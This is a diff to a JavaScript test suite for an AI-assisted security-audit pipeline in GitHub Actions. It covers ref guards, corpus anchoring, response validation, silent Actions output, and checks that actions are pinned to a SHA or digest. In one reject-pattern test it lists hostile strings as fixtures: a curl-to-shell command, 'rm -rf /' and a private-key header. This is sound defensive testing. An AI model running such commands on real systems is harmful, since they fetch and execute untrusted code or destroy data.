@@ -80,6 +80,7 @@ function runScript(script, argv, extraEnv = {}, cwd = REPO_ROOT) {
     env: {
       ...process.env,
       GITHUB_OUTPUT: '',
+      GITHUB_ACTIONS: 'false',
       PATH: childPath(),
       Path: childPath(),
       ...extraEnv,
@@ -235,31 +236,29 @@ test('target ref and main-tip status are recorded for the audited commit', () =>
   assert.match(historical.stdout, /is_main_tip=false\b/);
 });
 
-// A `workflow_dispatch` can be raised against any branch a contributor can push
-// to, and the executing workflow file is the copy on that branch. The guard is
-// therefore defence in depth behind the pinned controller checkouts: it refuses
-// to emit a validated target at all unless the controller ref is protected
-// `main`, so a fork-branch dispatch cannot borrow the audit's permissions.
-test('a manual dispatch from a branch other than main is refused', () => {
+// Repository dispatch always loads the default-branch workflow. The validator
+// retains a defence-in-depth ref assertion so a future trigger cannot
+// accidentally execute from another ref.
+test('an unexpected Actions controller ref is refused', () => {
   const attacker = runScript('validate-target.mjs', [], {
-    GITHUB_EVENT_NAME: 'workflow_dispatch',
+    GITHUB_EVENT_NAME: 'repository_dispatch',
     GITHUB_REF: 'refs/heads/attacker',
   });
-  assert.notEqual(attacker.status, 0, 'a dispatch from a non-main ref must fail closed');
+  assert.notEqual(attacker.status, 0, 'a non-main Actions ref must fail closed');
   assert.match(attacker.stderr, /refs\/heads\/main/);
   assert.doesNotMatch(attacker.stdout, /target_sha=/);
 
   // Same guard, tag ref: a tag is not the protected branch either.
   const tagged = runScript('validate-target.mjs', [], {
-    GITHUB_EVENT_NAME: 'workflow_dispatch',
+    GITHUB_EVENT_NAME: 'repository_dispatch',
     GITHUB_REF: 'refs/tags/v1.2.3',
   });
-  assert.notEqual(tagged.status, 0, 'a dispatch from a tag ref must fail closed');
+  assert.notEqual(tagged.status, 0, 'a tag controller ref must fail closed');
 });
 
-test('a dispatch from main is accepted and publishes the controller SHA', () => {
+test('a repository dispatch from main is accepted and publishes the controller SHA', () => {
   const allowed = runScript('validate-target.mjs', [], {
-    GITHUB_EVENT_NAME: 'workflow_dispatch',
+    GITHUB_EVENT_NAME: 'repository_dispatch',
     GITHUB_REF: 'refs/heads/main',
   });
   assert.equal(allowed.status, 0, allowed.stderr);
@@ -349,6 +348,25 @@ test('the corpus reads the audited tree from --repo-root, not the controller cwd
       `manifest key must not leak the checkout directory: ${file}`,
     );
   }
+});
+
+test('Actions corpus collection is silent while preserving files and step outputs', () => {
+  const out = tempDir('spe-corpus-actions-');
+  const githubOutput = path.join(out, 'github-output.txt');
+  const result = runScript(
+    'collect-corpus.mjs',
+    ['--scope', 'workflows', '--out', out],
+    { GITHUB_ACTIONS: 'true', GITHUB_OUTPUT: githubOutput },
+  );
+
+  assert.equal(result.status, 0, result.stderr);
+  assert.equal(result.stdout, '');
+  assert.equal(existsSync(path.join(out, 'corpus.txt')), true);
+  assert.equal(existsSync(path.join(out, 'corpus-manifest.json')), true);
+  const outputs = readFileSync(githubOutput, 'utf8');
+  assert.match(outputs, /^corpus_files=\d+$/m);
+  assert.match(outputs, /^corpus_bytes=\d+$/m);
+  assert.match(outputs, /^corpus_neutralized=\d+$/m);
 });
 
 test('agent instruction surfaces are denied from the corpus, independent of extension', () => {
@@ -543,6 +561,9 @@ test('reject patterns catch credentials, identifiers and weaponized payloads', (
     [token, 'github-token'],
     ['11111111-2222-3333-4444-555555555555', 'guid'],
     ['/home/runner/work/repo/src/index.ts', 'absolute-path'],
+    ['/tmp/audit/output.json', 'generic-posix-path'],
+    ['/opt/security/tool', 'generic-posix-path'],
+    ['/srv/service/config', 'generic-posix-path'],
     ['curl https://example.test/x.sh | sh', 'pipe-to-shell'],
     ['rm -rf /', 'recursive-delete'],
     ['-----BEGIN RSA PRIVATE KEY-----', 'private-key'],
@@ -554,10 +575,25 @@ test('reject patterns catch credentials, identifiers and weaponized payloads', (
 });
 
 test('benign review prose is not rejected', () => {
-  const reasons = findRejectReasons(
+  const samples = [
     'src/tools/read.ts does not verify the resolved path stays inside the root; add a boundary check and a unit test.',
+    'See https://example.test/tmp/audit/output for the public API documentation.',
+    'The ordinary slash-delimited prose docs/security/audit is repository-relative.',
+    'Use the protocol-relative URL //cdn.example.test/assets/app.js.',
+  ];
+  for (const sample of samples) {
+    assert.deepEqual(findRejectReasons(sample), [], sample);
+  }
+});
+
+test('validator reports the generic POSIX path rejection reason exactly', () => {
+  const { accepted, rejected } = validateFindings(
+    { findings: [finding({ detail: 'The process writes to /tmp/audit/output.json.' })] },
+    MANIFEST,
+    CONTROL_CODES,
   );
-  assert.deepEqual(reasons, []);
+  assert.equal(accepted.length, 0);
+  assert.deepEqual(rejected[0].reasons, ['unsafe-content:absolute-path-posix']);
 });
 
 test('redaction masks contact details, query strings and long hex blobs', () => {
@@ -611,6 +647,42 @@ test('findings outside the corpus or outside the file are rejected', () => {
   assert.equal(rejected.length, 2);
   assert.ok(rejected[0].reasons.includes('file-not-in-corpus'));
   assert.ok(rejected[1].reasons.includes('line-out-of-range'));
+});
+
+test('corpus anchoring accepts only owned, well-shaped manifest entries', () => {
+  const inheritedNames = ['constructor', 'toString'];
+  for (const file of inheritedNames) {
+    const { accepted, rejected } = validateFindings(
+      { findings: [finding({ file, line: 1 })] },
+      MANIFEST,
+      CONTROL_CODES,
+    );
+    assert.equal(accepted.length, 0);
+    assert.ok(rejected[0].reasons.includes('file-not-in-corpus'));
+  }
+
+  for (const lines of ['40', null, [], 0, 4.5]) {
+    const malformed = { files: { 'src/index.ts': { bytes: 100, lines } } };
+    const { accepted, rejected } = validateFindings(
+      { findings: [finding({ line: 1 })] },
+      malformed,
+      CONTROL_CODES,
+    );
+    assert.equal(accepted.length, 0);
+    assert.ok(rejected[0].reasons.includes('file-not-in-corpus'));
+  }
+});
+
+test('finding lines must be JSON numbers representing positive integers', () => {
+  for (const line of [true, '12', 12.5, null, 0, -1]) {
+    const { accepted, rejected } = validateFindings(
+      { findings: [finding({ line })] },
+      MANIFEST,
+      CONTROL_CODES,
+    );
+    assert.equal(accepted.length, 0);
+    assert.ok(rejected[0].reasons.includes('line-not-a-positive-integer'));
+  }
 });
 
 test('findings with an unmapped control, unknown severity or category are rejected', () => {
@@ -694,6 +766,13 @@ test('validate-response exits non-zero for malformed and unsafe responses', () =
     '--out', path.join(out, 'malformed.json'),
   ]);
   assert.equal(malformed.status, 1, 'malformed response must not exit 0');
+  assert.equal(malformed.stdout, '', 'malformed responses must not expose an oracle');
+  assert.match(malformed.stderr, /parseable JSON object/);
+  assert.equal(
+    existsSync(path.join(out, 'malformed.json')),
+    false,
+    'a malformed response must not produce a report eligible for submission',
+  );
 
   const unsafe = runScript('validate-response.mjs', [
     '--response', path.join(FIXTURES, 'unsafe-response.txt'),
@@ -701,6 +780,85 @@ test('validate-response exits non-zero for malformed and unsafe responses', () =
     '--out', path.join(out, 'unsafe.json'),
   ]);
   assert.equal(unsafe.status, 3, 'unsafe response must fail closed with exit 3');
+  assert.match(unsafe.stdout, /^security-audit: accepted=\d+ rejected=\d+ redactions=\d+\n$/);
+  assert.match(unsafe.stderr, /rejected findings detected; failing closed/);
+});
+
+test('a partially rejected response preserves only accepted findings before failing closed', () => {
+  const out = tempDir('spe-validate-partial-');
+  const manifestPath = path.join(out, 'manifest.json');
+  const responsePath = path.join(out, 'response.json');
+  const reportPath = path.join(out, 'report.json');
+  writeFileSync(manifestPath, JSON.stringify(MANIFEST));
+  writeFileSync(
+    responsePath,
+    JSON.stringify({
+      findings: [finding(), finding({ file: 'outside/corpus.ts', line: 1 })],
+    }),
+  );
+
+  const result = runScript('validate-response.mjs', [
+    '--response', responsePath,
+    '--manifest', manifestPath,
+    '--out', reportPath,
+  ]);
+
+  assert.equal(result.status, 3);
+  assert.match(result.stdout, /^security-audit: accepted=1 rejected=1 redactions=\d+\n$/);
+  assert.match(result.stderr, /rejected findings detected; failing closed/);
+  assert.equal(existsSync(reportPath), true);
+
+  const report = JSON.parse(readFileSync(reportPath, 'utf8'));
+  assert.equal(report.findings.length, 1, 'accepted findings remain eligible for private submission');
+  assert.equal(report.findings[0].file, 'src/index.ts');
+  assert.equal(report.rejected.length, 1);
+  assert.deepEqual(report.rejected[0], {
+    index: 1,
+    reasons: ['file-not-in-corpus'],
+  });
+});
+
+test('response validation is silent in Actions and preserves the private handoff report', () => {
+  const out = tempDir('spe-validate-actions-');
+  const manifestPath = path.join(out, 'manifest.json');
+  const responsePath = path.join(out, 'response.json');
+  const reportPath = path.join(out, 'report.json');
+  writeFileSync(manifestPath, JSON.stringify(MANIFEST));
+  writeFileSync(
+    responsePath,
+    JSON.stringify({
+      findings: [finding(), finding({ file: 'outside/corpus.ts', line: 1 })],
+    }),
+  );
+
+  const result = runScript(
+    'validate-response.mjs',
+    ['--response', responsePath, '--manifest', manifestPath, '--out', reportPath],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.equal(result.status, 3);
+  assert.equal(result.stdout, '');
+  assert.equal(result.stderr, '');
+  assert.equal(existsSync(reportPath), true);
+  assert.equal(JSON.parse(readFileSync(reportPath, 'utf8')).findings.length, 1);
+
+  const malformedPath = path.join(out, 'malformed.json');
+  const malformed = runScript(
+    'validate-response.mjs',
+    [
+      '--response',
+      path.join(FIXTURES, 'malformed-response.txt'),
+      '--manifest',
+      manifestPath,
+      '--out',
+      malformedPath,
+    ],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.equal(malformed.status, 1);
+  assert.equal(malformed.stdout, '');
+  assert.equal(malformed.stderr, '');
+  assert.equal(existsSync(malformedPath), false);
 });
 
 // ---------------------------------------------------------------------------
@@ -781,6 +939,60 @@ test('the sanitized gitleaks summary publishes counts without locations', () => 
   assert.equal(/\.ts/.test(text), false, 'file paths must not leak');
 });
 
+test('sanitizer success is local-only in Actions without changing files or failures', () => {
+  const out = tempDir('spe-sanitizer-actions-');
+  const input = path.join(out, 'audit.json');
+  const localOutput = path.join(out, 'local.json');
+  const actionsOutput = path.join(out, 'actions.json');
+  writeFileSync(
+    input,
+    JSON.stringify({
+      metadata: {
+        vulnerabilities: {
+          info: 0,
+          low: 0,
+          moderate: 0,
+          high: 0,
+          critical: 0,
+          total: 0,
+        },
+      },
+    }),
+  );
+
+  const local = runScript('sanitize-findings.mjs', [
+    '--kind',
+    'npm-audit',
+    '--in',
+    input,
+    '--out',
+    localOutput,
+  ]);
+  assert.equal(local.status, 0, local.stderr);
+  assert.match(local.stdout, /sanitized npm-audit summary/);
+  assert.equal(existsSync(localOutput), true);
+
+  const actions = runScript(
+    'sanitize-findings.mjs',
+    ['--kind', 'npm-audit', '--in', input, '--out', actionsOutput],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.equal(actions.status, 0, actions.stderr);
+  assert.equal(actions.stdout, '');
+  assert.equal(existsSync(actionsOutput), true);
+
+  const invalid = path.join(out, 'invalid.json');
+  writeFileSync(invalid, '{');
+  const failure = runScript(
+    'sanitize-findings.mjs',
+    ['--kind', 'npm-audit', '--in', invalid, '--out', path.join(out, 'never.json')],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.notEqual(failure.status, 0);
+  assert.equal(failure.stdout, '');
+  assert.match(failure.stderr, /unable to parse/);
+});
+
 // ---------------------------------------------------------------------------
 // Status reporting when no credential exists
 // ---------------------------------------------------------------------------
@@ -817,7 +1029,7 @@ test('a passing summary renders the generic PASS literal and nothing else', () =
   assert.equal(/AI |NOT_CONFIGURED|COMPLETED/.test(summary.markdown), false);
 });
 
-test('a failing summary renders the generic FAIL literal that points at private reporting', () => {
+test('a deterministic failure renders a truthful generic FAIL without claiming a report exists', () => {
   const summary = buildSummary({
     'dependency-audit': 'failure',
     'secret-scan': 'success',
@@ -827,7 +1039,48 @@ test('a failing summary renders the generic FAIL literal that points at private 
   });
   assert.equal(summary.failed, true);
   assert.equal(summary.markdown, `${PUBLIC_SUMMARY_FAIL}\n`);
-  assert.match(summary.markdown, /reported privately to maintainers/);
+  assert.equal(summary.markdown, 'Security audit: FAIL\n');
+  assert.equal(/report|private|maintainer/i.test(summary.markdown), false);
+});
+
+test('a model failure or cancellation can never be reported as PASS', () => {
+  for (const model of ['failure', 'cancelled']) {
+    const summary = buildSummary({
+      'dependency-audit': 'success',
+      'secret-scan': 'success',
+      'action-pins': 'success',
+      model,
+      'dry-run': 'false',
+    });
+    assert.equal(summary.failed, true, `${model} must fail the public verdict`);
+    assert.equal(summary.markdown, `${PUBLIC_SUMMARY_FAIL}\n`);
+  }
+});
+
+test('a failed or cancelled model dry run can never be reported as PASS', () => {
+  for (const dryRunResult of ['failure', 'cancelled', 'skipped']) {
+    const summary = buildSummary({
+      'dependency-audit': 'success',
+      'secret-scan': 'success',
+      'action-pins': 'success',
+      model: 'skipped',
+      'model-dry-run': dryRunResult,
+      'dry-run': 'true',
+    });
+    assert.equal(summary.failed, true, `${dryRunResult} dry run must fail`);
+    assert.equal(summary.markdown, `${PUBLIC_SUMMARY_FAIL}\n`);
+  }
+
+  const success = buildSummary({
+    'dependency-audit': 'success',
+    'secret-scan': 'success',
+    'action-pins': 'success',
+    model: 'skipped',
+    'model-dry-run': 'success',
+    'dry-run': 'true',
+  });
+  assert.equal(success.failed, false);
+  assert.equal(success.markdown, `${PUBLIC_SUMMARY_PASS}\n`);
 });
 
 // Whatever the inputs, the rendered markdown must be one of the two approved
@@ -920,6 +1173,31 @@ test('the dry run prints no finding detail on stdout', () => {
   assert.equal(result.stdout.trim().split('\n').length, 1, 'stdout must be a single line');
 });
 
+test('Actions dry-run failures expose only the fixed generic verdict', () => {
+  const missingRoot = path.join(tempDir('spe-dryrun-missing-'), 'not-present');
+  const actions = runScript(
+    'dry-run.mjs',
+    ['--scope', 'server-core', '--out', tempDir('spe-dryrun-actions-'), '--repo-root', missingRoot],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.notEqual(actions.status, 0);
+  assert.equal(actions.stdout, '');
+  assert.equal(actions.stderr, 'Security audit: FAIL\n');
+  assert.equal(actions.stderr.includes(missingRoot), false);
+  assert.equal(/collect|corpus|stage|exit|path/i.test(actions.stderr), false);
+
+  const local = runScript('dry-run.mjs', [
+    '--scope',
+    'server-core',
+    '--out',
+    tempDir('spe-dryrun-local-failure-'),
+    '--repo-root',
+    missingRoot,
+  ]);
+  assert.notEqual(local.status, 0);
+  assert.match(local.stderr, /collect corpus|unable to enumerate/i);
+});
+
 // ---------------------------------------------------------------------------
 // Prompt assembly: the trusted suffix and the injected vocabulary
 // ---------------------------------------------------------------------------
@@ -933,6 +1211,7 @@ test('rendered prompts carry the run nonce and leave no unresolved placeholders'
 
   const built = runScript('build-prompt.mjs', ['--corpus', corpusOut, '--out', promptOut]);
   assert.equal(built.status, 0, built.stderr);
+  assert.match(built.stdout, /build-prompt:/);
 
   const manifest = JSON.parse(readFileSync(path.join(corpusOut, 'corpus-manifest.json'), 'utf8'));
   const system = readFileSync(path.join(promptOut, 'system.txt'), 'utf8');
@@ -954,6 +1233,17 @@ test('rendered prompts carry the run nonce and leave no unresolved placeholders'
     prompt.indexOf(manifest.delimiters.end) < marker,
     'the trusted suffix must follow every fenced corpus file',
   );
+
+  const actionsOut = tempDir('spe-prompt-actions-');
+  const actions = runScript(
+    'build-prompt.mjs',
+    ['--corpus', corpusOut, '--out', actionsOut],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.equal(actions.status, 0, actions.stderr);
+  assert.equal(actions.stdout, '');
+  assert.equal(existsSync(path.join(actionsOut, 'system.txt')), true);
+  assert.equal(existsSync(path.join(actionsOut, 'prompt.txt')), true);
 });
 
 test('the rendered vocabulary is injected from constants and cannot drift', () => {
@@ -995,10 +1285,151 @@ test('an unpinned composite action is flagged wherever it lives', () => {
   assert.match(violations[0].file, /actions\/helper\/action\.yml$/);
 });
 
+test('hidden composite-action directories are scanned by default', () => {
+  const root = tempDir('spe-hidden-composite-');
+  const nested = path.join(root, '.actions', 'helper');
+  mkdirSync(nested, { recursive: true });
+  writeFileSync(
+    path.join(nested, 'action.yml'),
+    ['runs:', '  using: composite', '  steps:', '    - uses: actions/checkout@v5', ''].join('\n'),
+    'utf8',
+  );
+
+  const violations = checkCompositeActions(root);
+  assert.equal(violations.length, 1, JSON.stringify(violations));
+  assert.match(violations[0].file, /\.actions\/helper\/action\.yml$/);
+});
+
+test('only explicit generated and dependency directories are skipped', () => {
+  const root = tempDir('spe-skipped-composites-');
+  for (const name of ['node_modules', '.git', 'dist', 'coverage', '.security-audit']) {
+    const nested = path.join(root, name, 'nested');
+    mkdirSync(nested, { recursive: true });
+    writeFileSync(
+      path.join(nested, 'action.yml'),
+      ['runs:', '  using: composite', '  steps:', '    - uses: actions/checkout@v5', ''].join('\n'),
+      'utf8',
+    );
+  }
+  assert.deepEqual(checkCompositeActions(root), []);
+});
+
 test('a pinned reference with a version comment is accepted', () => {
   const pinned = `    - uses: actions/checkout@${'3'.repeat(40)} # v7.0.1\n`;
   assert.deepEqual(checkWorkflowSource(pinned, 'action.yml'), []);
   assert.equal(checkWorkflowSource(`    - uses: actions/checkout@${'3'.repeat(40)}\n`, 'a.yml').length, 1);
+});
+
+test('YAML-aware uses extraction covers spacing, quoted keys, flow maps, and reusable jobs', () => {
+  const first = 'a'.repeat(40);
+  const second = 'b'.repeat(40);
+  const third = 'c'.repeat(40);
+  const source = [
+    'name: alternate encodings',
+    'on: {}',
+    'jobs:',
+    '  call:',
+    `    'uses' : org/repo/.github/workflows/reuse.yml@${first} # v1`,
+    '  build:',
+    '    runs-on: ubuntu-latest',
+    '    steps:',
+    `      - { "uses": "org/action@${second}" } # v2`,
+    `      - uses : org/other@${third} # v3`,
+    '',
+  ].join('\n');
+  assert.deepEqual(checkWorkflowSource(source, 'workflow.yml'), []);
+
+  const unpinned = source.replace(`org/action@${second}`, 'org/action@v2');
+  const violations = checkWorkflowSource(unpinned, 'workflow.yml');
+  assert.equal(violations.length, 1);
+  assert.equal(violations[0].uses, 'org/action@v2');
+  assert.equal(violations[0].reason, 'not-sha-pinned');
+});
+
+test('ambiguous YAML constructs fail closed instead of hiding uses references', () => {
+  const sha = 'd'.repeat(40);
+  const cases = [
+    [
+      'steps:',
+      `  - uses: org/first@${sha} # v1`,
+      `    uses: org/second@${sha} # v1`,
+      '',
+    ].join('\n'),
+    [
+      `shared: &shared { uses: "org/action@${sha}" } # v1`,
+      'steps:',
+      '  - *shared',
+      '',
+    ].join('\n'),
+    [
+      `shared: &shared { uses: "org/action@${sha}" } # v1`,
+      'step:',
+      '  <<: *shared',
+      '',
+    ].join('\n'),
+  ];
+  for (const source of cases) {
+    assert.throws(() => checkWorkflowSource(source, 'ambiguous.yml'), /YAML|yaml|duplicate|anchor|merge/i);
+  }
+});
+
+test('Docker actions require an immutable sha256 digest and a version comment', () => {
+  const lower = 'a'.repeat(64);
+  const upper = 'B'.repeat(64);
+  for (const reference of [
+    `docker://ghcr.io/example/action@sha256:${lower}`,
+    `docker://registry.example.test:5000/example/action@sha256:${upper}`,
+  ]) {
+    assert.deepEqual(checkWorkflowSource(`steps:\n  - uses: ${reference} # v1\n`, 'docker.yml'), []);
+  }
+
+  for (const reference of [
+    'docker://ghcr.io/example/action:latest',
+    'docker://ghcr.io/example/action:v1',
+    `docker://ghcr.io/example/action@sha256:${'c'.repeat(63)}`,
+  ]) {
+    const violations = checkWorkflowSource(`steps:\n  - uses: ${reference} # v1\n`, 'docker.yml');
+    assert.equal(violations.length, 1);
+    assert.equal(violations[0].reason, 'not-digest-pinned');
+  }
+
+  const undocumented = checkWorkflowSource(
+    `steps:\n  - uses: docker://ghcr.io/example/action@sha256:${lower}\n`,
+    'docker.yml',
+  );
+  assert.equal(undocumented[0].reason, 'missing-version-comment');
+  assert.deepEqual(checkWorkflowSource('steps:\n  - uses: ./.actions/local\n', 'local.yml'), []);
+});
+
+test('the pin-check CLI is silent on Actions success and preserves failure semantics', () => {
+  const root = tempDir('spe-pins-actions-');
+  const workflows = path.join(root, '.github', 'workflows');
+  mkdirSync(workflows, { recursive: true });
+  const workflow = path.join(workflows, 'ci.yml');
+  writeFileSync(
+    workflow,
+    `steps:\n  - uses: actions/checkout@${'e'.repeat(40)} # v1\n`,
+    'utf8',
+  );
+
+  const success = runScript(
+    'check-action-pins.mjs',
+    ['--dir', workflows, '--root', root],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.equal(success.status, 0, success.stderr);
+  assert.equal(success.stdout, '');
+  assert.equal(success.stderr, '');
+
+  writeFileSync(workflow, 'steps:\n  - uses: actions/checkout@v5\n', 'utf8');
+  const failure = runScript(
+    'check-action-pins.mjs',
+    ['--dir', workflows, '--root', root],
+    { GITHUB_ACTIONS: 'true' },
+  );
+  assert.notEqual(failure.status, 0);
+  assert.equal(failure.stdout, '');
+  assert.match(failure.stderr, /not-sha-pinned/);
 });
 
 
